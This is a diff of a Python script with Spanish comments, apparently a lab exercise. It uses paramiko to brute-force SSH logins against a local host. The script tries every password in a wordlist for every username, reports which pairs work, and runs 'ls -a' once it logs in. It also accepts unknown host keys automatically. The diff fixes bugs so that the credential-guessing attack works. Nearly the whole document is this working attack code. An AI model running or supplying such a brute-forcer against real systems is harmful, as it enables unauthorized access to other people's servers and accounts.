@@ -1,59 +1,71 @@
-# PARAMIKO tienen su propia pagina con documentacion muy sencilla
+# PARAMIKO tiene su propia pagina con documentacion muy sencilla
 # Es documentacion escrita para humanos
-# PRimero tenemos que installarlo con pip install paramiko
+# Primero se tiene que installar con pip install paramiko
 import paramiko
 from paramiko import SSHClient
 
-# Selecciono mi IP como host
+# Se selecciona local  IP como host
 
-host = "172.23.151.23"
+host = "172.17.0.1"
 
-users = open('users', 'r')
+users = open('users.txt', 'r')
 
-# Abrimos el fichero usuerios y lo leemos
-while True:
-    # Queremos leer el usuario sin nigunsalto de lineao pegado al siguiente ususario
-    user = users.readline().rstrip('/n') # Cambiar por back slash
+# Esta variabel se cambia a Flase cuando para salir del bucle
+var = True
+# Se abre el fichero usuerios y lo leemos
+while (var == True):
+    # Se quiere leer el usuario sin nigun salto de lineao pegado al siguiente ususario
+    user = users.readline().rstrip('\n') 
     
     if not user:
         break
-    passwords = open('passwords','r')
+    passwords = open('passwords.txt','r')
     
     
-    # EN este bucle vamos a ir porbando cada usuario del fichero con todas las contraseñas
+    # En este bucle se va a ir probando cada usuario del fichero con todas las contraseñas
     # Asi si hara con cada usuarios hasta que encontremos alguno
     while True:
-        passw = passwords.readline().rstrip('/n')
+        passw = passwords.readline().rstrip('\n')
     
         if not passw:
             break
         
         # conectar con PARAMIKO
         
-        # utilizo la clase SSHClient para crear un cliente
-        # Recordar que cuando se hace una connecion con SSH la primera vez nos pide el finger print
-        # Si no puedo validar el certificado que me estan dando 
-        # CUnado aceptamos el finger print se installa
+        # Se utiliza la clase SSHClient para crear un cliente
+        # Recordar que cuando se hace una connecion con SSH la primera vez se pide el finger print
+        # Si no se puede validar el certificado que  estan dando 
+        # Cuando se acepta el finger print se installa
         client = SSHClient()
-
-        # La host key es el certificado que nos da el servidor
-        # Entonces utilizo una politica para validarlo
-        # RejectPolicy ------ Si no puedo validarlo no entro
-        #AutoAddPolicy ------ Automaticamente añade el certificado. Nuestro objeto le sale el mensaje y dice :" Si, si. Confio en el certificado"
-        # SI no cambio la politica queda por defecto RejectPolicy
+        # La host key es el certificado que  da el servidor
+        # Entonces se utiliza una politica para validarlo
+        # RejectPolicy ------ Si no se puede validarlo no entro
+        #AutoAddPolicy ------ Automaticamente añade el certificado. El objeto le sale el mensaje y dice :" Si, si. Confio en el certificado"
+        # Si no se cambia la politica queda por defecto RejectPolicy
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
         
         try:
-            # Ahora nos conectamos 
-            # El user es el username que estamos leyendo
-            client.connect(host,username=user,password=passwd)
+            # Ahora se realiza la conexion 
+            # El user es el username que see leyendo
+            client.connect(host,username=user,password=passw)
             print('user {} - pass {} auth OK!'.format(user,passw))
+
+            # Uua vez conectados ejecutamos un comando
+            # En la documentacion encontramos todos los parametro que acepta la funcion
+            # EL metodo nos devuelve tres elementos
+            stdin, stdout, stderr = client.exec_command('ls -a')
+            # Aqui leo la informacion del STDOUT
+            for line in stdout.readlines():
+                print(line)
             
-        except AuthenticationException:
+            # Si se pudo imprimir los directorios significa que hubo conexion y se pasa la variabal a false.
+            var = False
+
+        except paramiko.AuthenticationException as e:
             print('user {} - pass {} auth fallida!'.format(user,passw))
             
-        except SSHException:
-            print('SSH Exception')
+        except Exception as e:
+            print("*** Caught exception: %s: %s" % (e.__class__, e))
             
     passwords.close()
 users.close()
